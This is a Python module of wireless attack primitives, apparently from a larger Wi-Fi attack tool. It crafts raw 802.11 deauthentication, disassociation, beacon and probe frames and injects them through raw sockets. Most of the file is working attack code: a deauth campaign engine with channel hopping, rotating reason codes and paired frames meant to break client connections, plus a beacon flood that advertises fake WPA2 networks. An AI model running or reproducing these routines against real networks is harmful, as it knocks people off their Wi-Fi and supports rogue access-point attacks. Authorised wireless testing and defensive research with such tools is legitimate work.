"""Native wireless attack primitives.

Everything here talks to the radio directly through AF_PACKET raw sockets.
No dependency on aircrack-ng, mdk4 or hcxdumptool — the fallback chain in
``executor.py`` prefers those when present, but every attack also runs on this
implementation alone.

Frame construction follows IEEE 802.11-2020:
  * management frames carry the 24-byte MAC header + body
  * radiotap header precedes every frame sent through a monitor interface
  * the Frame Check Sequence is appended by the radio, never by us
"""

from __future__ import annotations

import os
import random
import socket
import struct
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Iterable, Optional

# --------------------------------------------------------------------------- #
# Constants
# --------------------------------------------------------------------------- #

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

# 802.11 reason codes worth cycling. Servers/APs react differently to each, and
# some client firmwares swallow a specific code but honour another.
REASON_CODES = (
    1,   # unspecified
    2,   # previous authentication no longer valid
    3,   # deauthenticated because sending STA is leaving IBSS/ESS
    4,   # disassociated due to inactivity
    6,   # class 2 frame received from nonauthenticated STA
    7,   # class 3 frame received from nonassociated STA
    15,  # 4-way handshake timeout
)

BANDS = {
    "2.4": (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13),
    "5": (
        36, 40, 44, 48, 52, 56, 60, 64,
        100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,
        149, 153, 157, 161, 165, 169,
    ),
    "6": (1, 5, 9, 13, 17, 21, 25, 29, 33, 37, 41, 45, 49, 53, 57, 61,
          65, 69, 73, 77, 81, 85, 89, 93, 97, 101, 105, 109, 113, 117,
          121, 125, 129, 133, 137, 141, 145, 149, 153, 157, 161, 165,
          169, 173, 177, 181, 185, 189, 193, 197, 201, 205, 209, 213,
          217, 221, 225, 229, 233),
}


def channels_for(band: str) -> tuple[int, ...]:
    return BANDS.get(band, ())


# --------------------------------------------------------------------------- #
# MAC + frame helpers
# --------------------------------------------------------------------------- #


def mac_bytes(mac: str) -> bytes:
    mac = mac.replace("-", ":").strip()
    parts = mac.split(":")
    if len(parts) != 6:
        raise ValueError(f"invalid MAC: {mac}")
    return bytes(int(p, 16) for p in parts)


def random_mac(oui: Optional[str] = None) -> str:
    """Locally administered random MAC, optionally under a given OUI."""
    if oui:
        prefix = oui.replace("-", ":").lower().split(":")[:3]
        tail = [random.randint(0, 255) for _ in range(3)]
        return ":".join(prefix).lower() + ":" + ":".join(f"{b:02x}" for b in tail)
    first = random.randint(0, 255) & 0xFC | 0x02  # set locally-administered bit
    rest = [random.randint(0, 255) for _ in range(5)]
    return ":".join(f"{b:02x}" for b in [first, *rest])


def radiotap_header(flags: int = 0, rate: int = 0) -> bytes:
    """Minimal radiotap header: version, pad, length, one present word.

    The flags field tells the radio how to treat the frame; ``flags=0x10``
    marks a frame it must not retry, which is what deauth bursts want.
    """
    present = 0
    fields = b""
    if flags:
        present |= 1 << 1  # FLAGS
        fields += bytes([flags])
    if rate:
        present |= 1 << 2  # RATE
        fields += bytes([rate])

    # Every present field must be padded to its natural alignment; FLAGS is one
    # byte and RATE is one byte, so padding only depends on the present word.
    body = fields
    while len(body) % 4:
        body += b"\x00"
    length = 8 + len(body)
    return struct.pack("<BBHI", 0, 0, length, present) + body


def _sequence_control(seq: int) -> bytes:
    return struct.pack("<H", (seq & 0xFFF) << 4)


def deauth_frame(bssid: str, station: str, reason: int = 7, seq: int = 0,
                 retry_suppress: bool = True) -> bytes:
    flags = 0x10 if retry_suppress else 0
    radiotap = radiotap_header(flags=flags)
    frame_control = struct.pack("<H", 0x00C0)         # deauth, management
    duration = struct.pack("<H", 0x013A)
    dst = mac_bytes(station)
    src = mac_bytes(bssid)
    bssid_b = mac_bytes(bssid)
    header = frame_control + duration + dst + src + bssid_b + _sequence_control(seq)
    body = struct.pack("<H", reason)
    return radiotap + header + body


def disassoc_frame(bssid: str, station: str, reason: int = 7, seq: int = 0) -> bytes:
    radiotap = radiotap_header(flags=0x10)
    frame_control = struct.pack("<H", 0x00A0)         # disassoc, management
    dst = mac_bytes(station)
    src = mac_bytes(bssid)
    bssid_b = mac_bytes(bssid)
    header = frame_control + struct.pack("<H", 0x013A) + dst + src + bssid_b + _sequence_control(seq)
    return radiotap + header + struct.pack("<H", reason)


def authentication_frame(bssid: str, station: str, seq: int = 0, algo: int = 0) -> bytes:
    """Open-system authentication request — used to make a client rejoin."""
    radiotap = radiotap_header()
    frame_control = struct.pack("<H", 0x00B0)
    dst = mac_bytes(bssid)
    src = mac_bytes(station)
    bssid_b = mac_bytes(bssid)
    header = frame_control + struct.pack("<H", 0x013A) + dst + src + bssid_b + _sequence_control(seq)
    body = struct.pack("<HHH", algo, seq & 0xFFFF, 0)
    return radiotap + header + body


def beacon_frame(ssid: str, bssid: str, channel: int = 6, seq: int = 0,
                 rsn: bool = True, hidden: bool = False) -> bytes:
    """Craft a beacon advertising `ssid` on `channel` as `bssid`."""
    radiotap = radiotap_header()
    frame_control = struct.pack("<H", 0x0080)         # beacon
    dst = bytes.fromhex("ffffffffffff")
    src = mac_bytes(bssid)
    # Fixed-parameter field: timestamp, beacon interval (100 TU), capability (ESS)
    timestamp = b"\x00" * 8
    interval = struct.pack("<H", 100)
    capability = struct.pack("<H", 0x0401 if rsn else 0x0001)

    ssid_bytes = b"" if hidden else ssid.encode("utf-8", "replace")[:32]
    ssid_ie = struct.pack("<BB", 0, len(ssid_bytes)) + ssid_bytes

    # Supported rates: 1, 2, 5.5, 11 Mbit/s (basic) + extended rates.
    rates_ie = bytes([1, 4, 0x82, 0x84, 0x8B, 0x96])
    ext_rates_ie = bytes([50, 4, 0x0C, 0x12, 0x18, 0x24])

    ds_ie = bytes([3, 1, channel & 0xFF])

    ies = ssid_ie + rates_ie + ds_ie + ext_rates_ie
    if rsn:
        # Minimal RSN IE: version 1, group cipher CCMP, one pairwise CCMP
        # suite, one AKM PSK. Enough that clients recognise it as WPA2-PSK.
        rsn_body = (
            b"\x01\x00"                     # version
            + b"\x00\x0f\xac\x04"           # group cipher: CCMP
            + b"\x01\x00\x00\x0f\xac\x04"   # pairwise count 1, CCMP
            + b"\x01\x00\x00\x0f\xac\x02"   # AKM count 1, PSK
            + b"\x00\x00"                   # RSN capabilities
        )
        ies += bytes([48, len(rsn_body)]) + rsn_body

    header = frame_control + struct.pack("<H", 0) + dst + src + src + _sequence_control(seq)
    return radiotap + header + timestamp + interval + capability + ies


def probe_request_frame(ssid: str, station: str, seq: int = 0) -> bytes:
    radiotap = radiotap_header()
    frame_control = struct.pack("<H", 0x0040)
    dst = bytes.fromhex("ffffffffffff")
    src = mac_bytes(station)
    bssid_b = bytes.fromhex("ffffffffffff")
    ssid_bytes = ssid.encode("utf-8", "replace")[:32]
    ies = struct.pack("<BB", 0, len(ssid_bytes)) + ssid_bytes
    header = frame_control + struct.pack("<H", 0) + dst + src + bssid_b + _sequence_control(seq)
    return radiotap + header + ies


# --------------------------------------------------------------------------- #
# Raw socket abstraction
# --------------------------------------------------------------------------- #


class RawInjector:
    """AF_PACKET raw socket bound to one interface."""

    def __init__(self, iface: str):
        self.iface = iface
        try:
            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            self.sock.bind((iface, 0))
        except PermissionError as exc:
            raise PermissionError(
                f"raw socket on {iface} requires root/CAP_NET_RAW"
            ) from exc
        except OSError as exc:
            raise OSError(f"cannot bind {iface}: {exc}") from exc

    def send(self, frame: bytes) -> int:
        try:
            return self.sock.send(frame)
        except OSError:
            return 0

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass

    def __enter__(self) -> "RawInjector":
        return self

    def __exit__(self, *exc) -> None:
        self.close()


def set_channel(iface: str, channel: int) -> bool:
    import subprocess
    try:
        return subprocess.run(
            ["iw", "dev", iface, "set", "channel", str(channel)],
            capture_output=True, timeout=3,
        ).returncode == 0
    except (OSError, Exception):
        return False


# --------------------------------------------------------------------------- #
# Deauthentication engine
# --------------------------------------------------------------------------- #


@dataclass
class DeauthConfig:
    iface: str
    bssid: str
    stations: list[str] = field(default_factory=lambda: [BROADCAST_MAC])
    reason: int = 7
    channel: int = 0
    bands: tuple[str, ...] = ("2.4", "5")
    burst: int = 1              # frames per station per cycle
    cycle_delay: float = 0.0    # seconds between rounds
    rotate_reason: bool = False
    hop_channels: bool = True
    duration: float = 0.0       # 0 = until stopped


def run_deauth(cfg: DeauthConfig,
               on_stats: Optional[Callable[[dict], None]] = None,
               stop_event: Optional[threading.Event] = None) -> dict:
    """Synchronously run a deauth campaign until stopped or duration ends."""
    stop_event = stop_event or threading.Event()
    started = time.time()

    frames = 0
    errors = 0
    seq = 0
    reason_idx = 0

    channels: list[int] = []
    if cfg.channel:
        channels = [cfg.channel]
    else:
        for band in cfg.bands:
            channels.extend(channels_for(band))
    if not channels:
        channels = list(channels_for("2.4"))

    with RawInjector(cfg.iface) as inj:
        ch_idx = 0
        while not stop_event.is_set():
            if cfg.duration and (time.time() - started) >= cfg.duration:
                break

            current_channel = None
            if cfg.hop_channels:
                current_channel = channels[ch_idx % len(channels)]
                set_channel(cfg.iface, current_channel)
                ch_idx += 1

            reason = REASON_CODES[reason_idx % len(REASON_CODES)] if cfg.rotate_reason else cfg.reason
            reason_idx += 1

            for station in cfg.stations:
                for _ in range(cfg.burst):
                    seq = (seq + 1) & 0xFFF
                    frame = deauth_frame(cfg.bssid, station, reason, seq)
                    if inj.send(frame):
                        frames += 1
                    else:
                        errors += 1
                    # Send the paired frame when targeting a real client: AP→STA
                    # one way, STA→AP the other, both directions break the link.
                    if station != BROADCAST_MAC:
                        seq = (seq + 1) & 0xFFF
                        reverse = deauth_frame(station, cfg.bssid, reason, seq)
                        if inj.send(reverse):
                            frames += 1
                        else:
                            errors += 1

            if on_stats:
                on_stats({
                    "frames": frames, "errors": errors,
                    "channel": current_channel, "reason": reason,
                    "elapsed": round(time.time() - started, 1),
                })

            if cfg.cycle_delay:
                stop_event.wait(cfg.cycle_delay)

    return {
        "frames": frames,
        "errors": errors,
        "elapsed": round(time.time() - started, 1),
        "pps": round(frames / max(0.1, time.time() - started), 1),
    }


# --------------------------------------------------------------------------- #
# Beacon / SSID flood
# --------------------------------------------------------------------------- #


@dataclass
class BeaconFloodConfig:
    iface: str
    ssid: str
    bssid: str = ""
    channel: int = 6
    count: int = 500
    hidden: bool = True
    rsn: bool = True
    interval: float = 0.0


def run_beacon_flood(cfg: BeaconFloodConfig,
                     stop_event: Optional[threading.Event] = None) -> dict:
    stop_event = stop_event or threading.Event()
    bssid = cfg.bssid or random_mac()
    sent = 0
    seq = 0
    started = time.time()

    set_channel(cfg.iface, cfg.channel)
    with RawInjector(cfg.iface) as inj:
        while sent < cfg.count and not stop_event.is_set():
            seq = (seq + 1) & 0xFFF
            frame = beacon_frame(cfg.ssid, bssid, cfg.channel, seq,
                                 rsn=cfg.rsn, hidden=cfg.hidden)
            if inj.send(frame):
                sent += 1
            if cfg.interval:
                stop_event.wait(cfg.interval)

    return {
        "sent": sent, "bssid": bssid,
        "elapsed": round(time.time() - started, 2),
    }


# --------------------------------------------------------------------------- #
# Injection self-test
# --------------------------------------------------------------------------- #


def injection_test(iface: str, bssid: str = "02:00:00:00:00:01",
                   frames: int = 10) -> dict:
    """Send a handful of beacons and report how many the radio accepted.

    This is the fastest way to answer "can this adapter actually inject?".
    A card that can put frames on the air returns >0; one that only offers
    monitor mode returns 0.
    """
    sent = 0
    errors = 0
    set_channel(iface, 6)
    with RawInjector(iface) as inj:
        for i in range(frames):
            frame = beacon_frame(f"INJTEST-{i}", bssid, 6, i, rsn=False, hidden=False)
            if inj.send(frame):
                sent += 1
            else:
                errors += 1
    return {"sent": sent, "errors": errors, "total": frames,
            "injects": sent > 0}
